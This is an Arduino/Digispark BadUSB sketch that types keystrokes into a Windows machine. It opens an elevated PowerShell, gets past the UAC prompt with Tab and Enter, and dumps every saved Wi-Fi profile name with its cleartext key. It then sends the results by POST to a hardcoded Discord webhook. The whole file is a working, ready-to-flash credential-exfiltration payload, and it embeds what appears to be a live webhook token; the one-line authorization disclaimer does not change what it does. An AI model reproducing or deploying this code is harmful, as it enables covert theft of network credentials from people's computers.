/*
 * DisPark - Admin PowerShell Wi-Fi Exfil (Working + exit at end)
 *
 * Legal: Only run on systems you own or have explicit written authorization to test.
 */

#include "DigiKeyboard.h"

#define HOOK_URL   "https://discordapp.com/api/webhooks/1551099096356618280/9gYAjv7ieTXnTvXDCphmMTTqp32sOcL6idCkTaAn7KiBRDqCDhT99NycDiwtQJJ9Shfr"
#define LED_PIN    1

#define T_BOOT        3000
#define T_RUN_OPEN     900
#define T_LAUNCH       700
#define T_UAC_WAIT    4500
#define T_TAB          600
#define T_PS_LOAD     6000
#define T_STEP         700
#define T_FINISH     10000

void setup() {
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(T_BOOT);

  // 1. Open Run
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(T_RUN_OPEN);

  // 2. Type launch command
  DigiKeyboard.print(F("powershell -Command \"Start-Process powershell -Verb RunAs\""));
  DigiKeyboard.delay(T_LAUNCH);

  // 3. ENTER -> triggers UAC
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(T_UAC_WAIT);

  // 4. TAB TAB ENTER -> click Yes
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(T_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(T_TAB);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // 5. Wait for elevated PS
  DigiKeyboard.delay(T_PS_LOAD);

  // 6. Get profile names
  DigiKeyboard.print(F("$n=(netsh wlan show profiles|Select-String 'All User Profile'|%{$_.ToString().Split(':')[1].Trim()})"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(T_STEP);

  // 7. Write FOUND count (the debug line that worked)
  DigiKeyboard.print(F("Write-Host \"FOUND:\" $n.Count \"profiles\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(T_STEP);

  // 8. Loop and build output
  DigiKeyboard.print(F("$o=@();foreach($x in $n){$d=netsh wlan show profile name=$x key=clear;$k=($d|Select-String 'Key Content')-replace '.*:\\s*','';$o+=\"$x | $k\"}"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(T_STEP);

  // 9. Show collected output
  DigiKeyboard.print(F("Write-Host $o"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(T_STEP);

  // 10. Write temp file
  DigiKeyboard.print(F("$o|Out-File $env:TEMP\\w.txt -Encoding UTF8"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(T_STEP);

  // 11. Build JSON
  DigiKeyboard.print(F("$b=(Get-Content $env:TEMP\\w.txt -Raw);$j=@{content=$b}|ConvertTo-Json -Compress"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(T_STEP);

  // 12. POST to webhook
  DigiKeyboard.print(F("Invoke-RestMethod -Uri '"));
  DigiKeyboard.delay(200);
  DigiKeyboard.print(F(HOOK_URL));
  DigiKeyboard.delay(200);
  DigiKeyboard.print(F("' -Method Post -Body $j -ContentType 'application/json'"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(T_STEP);

  // 13. Report done
  DigiKeyboard.print(F("Write-Host 'DONE'"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(T_STEP);

  // 14. === NEW: exit PowerShell ===
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // 15. LED done
  DigiKeyboard.delay(T_FINISH);
  digitalWrite(LED_PIN, HIGH);
  DigiKeyboard.delay(5000);
  digitalWrite(LED_PIN, LOW);

  while (1) { DigiKeyboard.update(); }
}